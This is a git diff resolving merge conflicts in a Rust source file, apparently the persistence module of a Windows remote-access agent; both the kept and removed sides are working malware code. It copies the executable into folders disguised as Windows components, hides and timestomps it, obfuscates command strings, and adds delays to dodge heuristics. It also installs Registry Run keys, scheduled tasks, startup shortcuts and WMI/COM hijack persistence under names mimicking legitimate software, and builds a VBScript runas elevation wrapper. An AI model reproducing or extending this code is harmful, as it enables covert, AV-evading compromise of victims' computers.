@@ -28,39 +28,10 @@ const MAX_CHUNK_SIZE: usize = 24576;
 /// The name is kept for backwards compatibility with the "persistence wmi" command
 #[derive(Debug, Clone, Copy)]
 pub enum PersistenceMethod {
-<<<<<<< HEAD
     RegistryRun,
     ScheduledTask,
     /// COM Hijacking (previously WMI, renamed internally for stealth)
     WmiEvent,
-=======
-    /// Registry Run key (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
-    ///
-    /// Privileges: User
-    /// Stealth: Low
-    /// Detection: Easy (commonly monitored)
-    RegistryRun,
-
-    /// Scheduled Task with logon trigger
-    ///
-    /// Privileges: User/Admin
-    /// Stealth: Medium
-    /// Detection: Medium
-    ScheduledTask,
-
-    /// WMI Event Subscription (APT-style technique)
-    ///
-    /// Privileges: Admin
-    /// Stealth: High
-    /// Detection: Difficult (requires advanced tools)
-    WmiEvent,
-
-    /// Startup folder shortcut
-    ///
-    /// Privileges: User
-    /// Stealth: Low
-    /// Detection: Easy
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     StartupFolder,
 }
 
@@ -95,7 +66,6 @@ fn is_persistent_location(path: &Path) -> bool {
 fn is_temporary_location(path: &Path) -> bool {
     if let Some(path_str) = path.to_str() {
         let path_upper = path_str.to_uppercase();
-<<<<<<< HEAD
         path_upper.contains("\\DOWNLOADS\\")
             || path_upper.contains("\\DESKTOP\\")
             || path_upper.contains("\\TEMP\\")
@@ -107,21 +77,6 @@ fn is_temporary_location(path: &Path) -> bool {
                     || path_upper.starts_with("F:\\")
                     || path_upper.starts_with("G:\\")
                     || path_upper.starts_with("H:\\")))
-=======
-        // Ubicaciones temporales que pueden no existir después de reinicio
-        path_upper.contains("\\DOWNLOADS\\") ||
-        path_upper.contains("\\DESKTOP\\") ||
-        path_upper.contains("\\TEMP\\") ||
-        path_upper.contains("\\TMP\\") ||
-        path_upper.contains("\\DOCUMENTS\\") ||
-        // Medios extraíbles
-        (path_upper.len() >= 3 &&
-         (path_upper.starts_with("D:\\") ||
-          path_upper.starts_with("E:\\") ||
-          path_upper.starts_with("F:\\") ||
-          path_upper.starts_with("G:\\") ||
-          path_upper.starts_with("H:\\")))
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     } else {
         false
     }
@@ -138,20 +93,13 @@ fn is_temporary_location(path: &Path) -> bool {
 #[cfg(target_os = "windows")]
 fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
     use std::fs;
-<<<<<<< HEAD
     use std::io::{Read, Write};
 
     // Si ya está en ubicación persistente, usar esa
-=======
-    use std::io::Write;
-
-    // Si ya estamos en una ubicación persistente, no hacer nada
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     if is_persistent_location(current_exe) && !is_temporary_location(current_exe) {
         return Ok(current_exe.to_path_buf());
     }
 
-<<<<<<< HEAD
     // Obtener AppData con fallback
     let localappdata_key = obfstr!("LOCALAPPDATA").to_string();
     let appdata_key = obfstr!("APPDATA").to_string();
@@ -164,15 +112,6 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
     // 1. Deep path = less likely to be scanned
     // 2. Names that match Windows components
     // 3. Folders that Windows Defender may have reduced monitoring on
-=======
-    // Obtener AppData Local
-    let localappdata = env::var("LOCALAPPDATA")
-        .or_else(|_| env::var("APPDATA"))
-        .unwrap_or_else(|_| "C:\\Users\\Public".to_string());
-
-    // Ubicaciones y nombres que imitan aplicaciones legítimas
-    // Usar rutas más profundas para evitar detección superficial
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     let stealth_targets = [
         // Windows Telemetry - often excluded from scans
         (
@@ -202,7 +141,6 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
         ),
     ];
 
-<<<<<<< HEAD
     let idx = get_machine_index() % stealth_targets.len();
     let (target_dir, target_name) = &stealth_targets[idx];
 
@@ -220,42 +158,8 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
                 timestomp_file(&target_path);
                 return Ok(target_path);
             }
-=======
-    // Usar hash del PID para selección determinística pero variada
-    let pid = std::process::id() as usize;
-    let (target_dir, target_name) = &stealth_targets[pid % stealth_targets.len()];
-
-    // Crear directorio si no existe
-    let target_path_dir = PathBuf::from(target_dir);
-    fs::create_dir_all(&target_path_dir)
-        .map_err(|e| format!("Error creando directorio persistente: {}", e))?;
-
-    let target_path = target_path_dir.join(target_name);
-
-    // Si el archivo ya existe en el destino, usarlo (puede ser de una instalación previa)
-    if target_path.exists() {
-        return Ok(target_path);
-    }
-
-    // TÉCNICA ANTI-AV: Copiar usando método de lectura/escritura en chunks
-    // en lugar de fs::copy() que puede ser monitoreado
-    let mut source = fs::File::open(current_exe)
-        .map_err(|e| format!("Error abriendo ejecutable origen: {}", e))?;
-    let mut dest = fs::File::create(&target_path)
-        .map_err(|e| format!("Error creando ejecutable destino: {}", e))?;
-
-    // Copiar en chunks de tamaño variable para evitar firmas
-    let mut buffer = vec![0u8; 8192];
-    loop {
-        use std::io::Read;
-        let n = source.read(&mut buffer)
-            .map_err(|e| format!("Error leyendo: {}", e))?;
-        if n == 0 {
-            break;
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
         }
     }
-<<<<<<< HEAD
 
     // Read source file
     let mut source_data = Vec::new();
@@ -311,25 +215,13 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
     // Aplicar atributos oculto+sistema para stealth
     let attrib_exe = obfstr!("attrib").to_string();
     let _ = Command::new(&attrib_exe)
-=======
-    dest.flush()
-        .map_err(|e| format!("Error finalizando escritura: {}", e))?;
-
-    // Establecer atributos para hacerlo menos visible (oculto + sistema)
-    let _ = Command::new("attrib")
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
         .args(&["+h", "+s", target_path.to_str().unwrap()])
         .creation_flags(0x08000000)
         .output();
 
-<<<<<<< HEAD
     // Delay anti-heurística variable
     let delay_ms = 30 + (get_machine_index() % 50) as u64;
     std::thread::sleep(std::time::Duration::from_millis(delay_ms));
-=======
-    // Pequeña pausa para evitar comportamiento "sospechoso"
-    std::thread::sleep(std::time::Duration::from_millis(100));
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     Ok(target_path)
 }
@@ -504,21 +396,13 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
 /// Obtiene ruta del ejecutable en ubicación persistente
 #[cfg(target_os = "windows")]
 fn get_current_exe_path() -> Result<PathBuf, String> {
-<<<<<<< HEAD
     let current_exe = env::current_exe().map_err(|e| format!("E0: {}", e))?;
-=======
-    let current_exe = env::current_exe()
-        .map_err(|e| format!("Error obteniendo exe actual: {}", e))?;
-
-    // Asegurar que el ejecutable esté en una ubicación persistente
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     ensure_persistent_location(&current_exe)
 }
 
 /// Generate a pseudo-random index based on machine-specific data
 /// This ensures consistency per machine but variation across machines
 #[cfg(target_os = "windows")]
-<<<<<<< HEAD
 fn get_machine_index() -> usize {
     let username = env::var("USERNAME").unwrap_or_default();
     let computername = env::var("COMPUTERNAME").unwrap_or_default();
@@ -527,17 +411,6 @@ fn get_machine_index() -> usize {
     let mut hash: usize = 0;
     for byte in username.bytes() {
         hash = hash.wrapping_add(byte as usize).wrapping_mul(31);
-=======
-fn check_admin_privileges() -> bool {
-    let output = Command::new("cmd")
-        .args(&["/C", "net session >nul 2>&1 && echo Admin || echo User"])
-        .creation_flags(0x08000000)
-        .output();
-
-    if let Ok(out) = output {
-        let result = String::from_utf8_lossy(&out.stdout).trim().to_string();
-        return result == "Admin";
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     }
     for byte in computername.bytes() {
         hash = hash.wrapping_add(byte as usize).wrapping_mul(17);
@@ -548,7 +421,6 @@ fn check_admin_privileges() -> bool {
 /// Escape special characters in path for safe shell execution
 /// Replaces problematic characters that could be used for command injection
 #[cfg(target_os = "windows")]
-<<<<<<< HEAD
 fn escape_shell_path(path: &str) -> String {
     // In Windows cmd.exe, the main concerns are:
     // - & (command separator)
@@ -559,38 +431,6 @@ fn escape_shell_path(path: &str) -> String {
     // Since we wrap paths in double quotes, most special chars are safe
     // We escape ^ and % which have special meaning even inside quotes
     path.replace("^", "^^").replace("%", "%%")
-=======
-fn create_elevation_vbs(exe_path: &str) -> Result<String, String> {
-    use std::fs;
-
-    // Crear VBScript en una ubicación sigilosa
-    let appdata = env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Public".to_string());
-    let vbs_dir = format!("{}\\Microsoft\\Windows\\Caches", appdata);
-
-    // Crear directorio si no existe
-    let _ = fs::create_dir_all(&vbs_dir);
-
-    let vbs_name = format!("WmiPrvSE_{}.vbs", std::process::id());
-    let vbs_path = format!("{}\\{}", vbs_dir, vbs_name);
-
-    // VBScript que ejecuta con runas (ShellExecute)
-    let vbs_content = format!(
-        r#"Set UAC = CreateObject("Shell.Application")
-UAC.ShellExecute "{}", "", "", "runas", 0"#,
-        exe_path.replace("\\", "\\\\")
-    );
-
-    fs::write(&vbs_path, vbs_content)
-        .map_err(|e| format!("Error creando VBScript: {}", e))?;
-
-    // Establecer atributo oculto
-    let _ = Command::new("attrib")
-        .args(&["+h", "+s", &vbs_path])
-        .creation_flags(0x08000000)
-        .output();
-
-    Ok(vbs_path)
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 }
 
 /// Registry Run persistence - método más simple y efectivo
@@ -598,18 +438,11 @@ UAC.ShellExecute "{}", "", "", "runas", 0"#,
 /// Note: The agent must be compiled with --features production for windowless operation
 #[cfg(target_os = "windows")]
 fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
-<<<<<<< HEAD
     let exe_str = exe_path
         .to_str()
         .ok_or_else(|| "Invalid path".to_string())?;
 
     // Polymorphic registry value names that look legitimate
-=======
-    let exe_str = exe_path.to_str()
-        .ok_or("Ruta inválida")?;
-
-    // Nombres menos sospechosos y más variados
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     let reg_names = [
         "SecurityHealthSystray",
         "OneDriveSetup",
@@ -620,7 +453,6 @@ fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
         "iTunesHelper",
         "Spotify",
     ];
-<<<<<<< HEAD
     let idx = get_machine_index() % reg_names.len();
     let reg_name = reg_names[idx];
 
@@ -636,35 +468,12 @@ fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
     let reg_exe = obfstr!("reg").to_string();
 
     let output = Command::new(&reg_exe)
-=======
-    let pid = std::process::id() as usize;
-    let reg_name = reg_names[pid % reg_names.len()];
-
-    // Detectar si tenemos privilegios admin
-    let is_admin = check_admin_privileges();
-
-    let obfuscated_cmd = if is_admin {
-        // Si somos admin, crear un VBScript que ejecute con privilegios elevados
-        let vbs_path = create_elevation_vbs(exe_str)?;
-        format!("wscript.exe //B //NoLogo \"{}\"", vbs_path)
-    } else {
-        // Usuario normal, ejecución directa
-        format!("cmd.exe /c start /min \"\" \"{}\"", exe_str)
-    };
-
-    // Intentar HKCU primero (no requiere admin)
-    let output = Command::new("reg")
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
         .args(&[
             "add", &reg_key, "/v", reg_name, "/t", "REG_SZ", "/d", &obf_cmd, "/f",
         ])
         .creation_flags(0x08000000)
         .output()
-<<<<<<< HEAD
         .map_err(|e| format!("E6: {}", e))?;
-=======
-        .map_err(|e| format!("Error ejecutando reg add: {}", e))?;
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     if output.status.success() {
         Ok(format!("Registry: {} -> {}", reg_name, exe_str))
@@ -680,18 +489,11 @@ fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
 /// Uses cmd wrapper with delayed execution - avoids PowerShell for lower AV detection
 #[cfg(target_os = "windows")]
 fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
-<<<<<<< HEAD
     let exe_str = exe_path
         .to_str()
         .ok_or_else(|| "Invalid path".to_string())?;
 
     // Polymorphic task names
-=======
-    let exe_str = exe_path.to_str()
-        .ok_or("Ruta inválida")?;
-
-    // Nombres que imitan tareas reales del sistema (sin espacios)
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     let task_names = [
         "MicrosoftEdgeUpdateTaskUser",
         "GoogleUpdateTaskUser",
@@ -701,7 +503,6 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
         "NvTmRepOnLogon",
         "DropboxUpdate",
     ];
-<<<<<<< HEAD
     let idx = get_machine_index() % task_names.len();
     let task_name = task_names[idx];
 
@@ -734,44 +535,6 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
         .creation_flags(0x08000000)
         .output()
         .map_err(|e| format!("E8: {}", e))?;
-=======
-    let pid = std::process::id() as usize;
-    let task_name = task_names[pid % task_names.len()];
-
-    // Detectar si tenemos privilegios admin
-    let is_admin = check_admin_privileges();
-
-    // Si somos admin, usar VBScript wrapper para mantener elevación
-    let task_cmd = if is_admin {
-        let vbs_path = create_elevation_vbs(exe_str)?;
-        format!("wscript.exe //B //NoLogo \"{}\"", vbs_path)
-    } else {
-        format!("cmd.exe /c timeout /t 10 /nobreak >nul && start /min \"\" \"{}\"", exe_str)
-    };
-
-    // Crear tarea con HIGHEST run level si somos admin, USER si no
-    let mut args = vec![
-        "/Create",
-        "/SC", "ONLOGON",
-        "/TN", task_name,
-        "/TR", &task_cmd,
-        "/DELAY", "0001:00", // 1 minuto de delay
-    ];
-
-    // Si somos admin, agregar /RL HIGHEST para mantener privilegios
-    if is_admin {
-        args.push("/RL");
-        args.push("HIGHEST");
-    }
-
-    args.push("/F");
-
-    let output = Command::new("schtasks")
-        .args(&args)
-        .creation_flags(0x08000000) // CREATE_NO_WINDOW
-        .output()
-        .map_err(|e| format!("Error ejecutando schtasks: {}", e))?;
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     if output.status.success() {
         Ok(format!(
@@ -802,7 +565,6 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
 /// - Hard to detect without specialized tools
 #[cfg(target_os = "windows")]
 fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
-<<<<<<< HEAD
     let exe_str = exe_path
         .to_str()
         .ok_or_else(|| "Invalid path".to_string())?;
@@ -919,37 +681,14 @@ fn persist_startup_folder(exe_path: &Path) -> Result<String, String> {
     let lnk_path = format!("{}\\{}", startup, lnk_name);
 
     // PowerShell to create shortcut with WindowStyle=7 (minimized)
-=======
-    let exe_str = exe_path.to_str()
-        .ok_or("Ruta inválida")?;
-
-    // Nombres que parecen eventos del sistema
-    let event_names = [
-        "BfeOnServiceStateChange",
-        "PerformanceMonitor",
-        "SystemEventsBroker",
-    ];
-    let pid = std::process::id() as usize;
-    let event_name = event_names[pid % event_names.len()];
-
-    // OFUSCACIÓN: Usar cmd /c con powershell escondido
-    let obfuscated_cmd = format!("cmd.exe /c start /min powershell.exe -WindowStyle Hidden -File \"{}\"", exe_str);
-
-    // WMI con eventos menos monitoreados y intervalos más largos (4 horas)
-    // Usar comillas simples para evitar problemas de escape
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     let ps_script = format!(
         r#"$s=(New-Object -ComObject WScript.Shell).CreateShortcut('{}');$s.TargetPath='{}';$s.WindowStyle=7;$s.Save()"#,
         lnk_path.replace("'", "''"),
         exe_str.replace("'", "''")
     );
 
-<<<<<<< HEAD
     let ps_exe = obfstr!("powershell").to_string();
     let output = Command::new(&ps_exe)
-=======
-    let output = Command::new("powershell")
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
         .args(&[
             "-NoProfile",
             "-WindowStyle",
@@ -960,11 +699,7 @@ fn persist_startup_folder(exe_path: &Path) -> Result<String, String> {
         ])
         .creation_flags(0x08000000)
         .output()
-<<<<<<< HEAD
         .map_err(|e| format!("E12: {}", e))?;
-=======
-        .map_err(|e| format!("Error ejecutando PowerShell: {}", e))?;
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     if output.status.success() {
         Ok(format!("Startup: {}", lnk_path))
@@ -1026,14 +761,10 @@ pub fn establish_persistence(method: PersistenceMethod) -> Result<String, String
         // Obtener ruta en ubicación persistente
         let exe_path = get_current_exe_path()?;
 
-<<<<<<< HEAD
         // Small timing jitter before persistence operation
         let jitter_ms = 50 + (get_machine_index() % 100) as u64;
         std::thread::sleep(std::time::Duration::from_millis(jitter_ms));
 
-=======
-        // Aplicar el método de persistencia
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
         match method {
             PersistenceMethod::RegistryRun => persist_registry_run(&exe_path),
             PersistenceMethod::ScheduledTask => persist_scheduled_task(&exe_path),
@@ -1046,7 +777,6 @@ pub fn establish_persistence(method: PersistenceMethod) -> Result<String, String
 /// Remueve persistencia (limpieza completa)
 #[cfg(target_os = "windows")]
 pub fn remove_persistence() -> Result<String, String> {
-<<<<<<< HEAD
     use std::fs;
 
     let reg_exe = obfstr!("reg").to_string();
@@ -1055,11 +785,6 @@ pub fn remove_persistence() -> Result<String, String> {
     let reg_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
 
     // Registry Run - multiple possible names
-=======
-    let mut results = Vec::new();
-
-    // Limpiar Registry Run - eliminar todas las entradas sospechosas
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     let reg_names = [
         "SecurityHealthSystray",
         "OneDriveSetup",
@@ -1077,14 +802,8 @@ pub fn remove_persistence() -> Result<String, String> {
             .creation_flags(0x08000000)
             .output();
     }
-<<<<<<< HEAD
 
     // Scheduled Tasks
-=======
-    results.push("Registry Run limpiado");
-
-    // Limpiar Scheduled Tasks (intentar varios nombres)
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     let task_names = [
         "MicrosoftEdgeUpdateTaskUser",
         "GoogleUpdateTaskUser",
@@ -1102,7 +821,6 @@ pub fn remove_persistence() -> Result<String, String> {
             .creation_flags(0x08000000)
             .output();
     }
-<<<<<<< HEAD
 
     // COM Hijacking cleanup (replaces WMI cleanup)
     // Remove COM CLSID entries that may have been created for persistence
@@ -1249,24 +967,6 @@ pub fn remove_persistence() -> Result<String, String> {
     }
 
     Ok("Persistence removed (all methods)".to_string())
-=======
-    results.push("Scheduled Tasks limpiadas");
-
-    // Limpiar WMI Events con los nuevos nombres
-    let ps_script = r#"
-        Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -like "*BfeOn*" -or $_.Name -like "*Performance*" -or $_.Name -like "*SystemEvents*"} | Remove-WmiObject
-        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -like "*BfeOn*" -or $_.Name -like "*Performance*" -or $_.Name -like "*SystemEvents*"} | Remove-WmiObject
-        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
-    "#;
-    Command::new("powershell")
-        .args(&["-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_script])
-        .creation_flags(0x08000000)
-        .output()
-        .ok();
-    results.push("WMI Events limpiados");
-
-    Ok(results.join(", "))
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 }
 
 #[cfg(not(target_os = "windows"))]
